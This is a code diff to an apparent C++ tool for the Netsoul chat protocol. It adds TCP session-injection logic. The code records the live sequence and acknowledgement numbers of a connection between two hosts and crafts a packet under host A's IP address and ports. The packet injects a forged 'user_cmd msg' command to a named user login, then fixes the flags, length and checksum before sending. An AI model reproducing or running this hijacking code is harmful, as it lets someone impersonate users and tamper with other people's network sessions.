@@ -237,9 +237,18 @@ bool Netsoul::isProtocol(Packet & p)
     bool isProtocol = false;
     if (portA && portB)
     {
-        if ((pTCP->source == portA && pTCP->dest == portB) ||
-            (pTCP->source == portB && pTCP->dest == portA))
-            isProtocol = true;
+      if ((pTCP->source == portA && pTCP->dest == portB))
+	{
+	  this->currentSeqA = pTCP->seq;
+	  this->currentSeqB = pTCP->ack_seq;
+	  isProtocol = true;
+	}
+      else if ((pTCP->source == portB && pTCP->dest == portA))
+	{
+	  this->currentSeqA = pTCP->ack_seq;
+	  this->currentSeqB = pTCP->seq;
+	  isProtocol = true;
+	}
     }
     else
     {
@@ -280,8 +289,16 @@ void Netsoul::sendNewMessage()
 
     tcp* testTCP = (tcp*)test.getBuffer();
 
-    //testTCP->craftTCP(this->info.macA, this->info.ipA, this->info.macB, this->info.ipB);
+    testTCP->craftTCP(this->info.mymac, this->info.ipA, this->info.macB, this->info.ipB,
+		      this->portA, this->portB, this->currentSeqA, this->currentSeqB);
+
+    test.append("user_cmd msg *:laland_a@*Unknown%20Location%20On%20SameSoul* msg ", 65);
+
     test.append("jesusjesusjesusjesus", 20);
+
+    testTCP->psh = 1;
+    testTCP->ip_len = 85;
+    testTCP->ip_sum = testTCP->checksumIP((uint16_t *)( ((unsigned char *)testTCP) + sizeof(eth)), 20 >> 1);
     this->socket.Write(test);
     delete this->currentNewMessage;
     this->currentNewMessage = NULL;
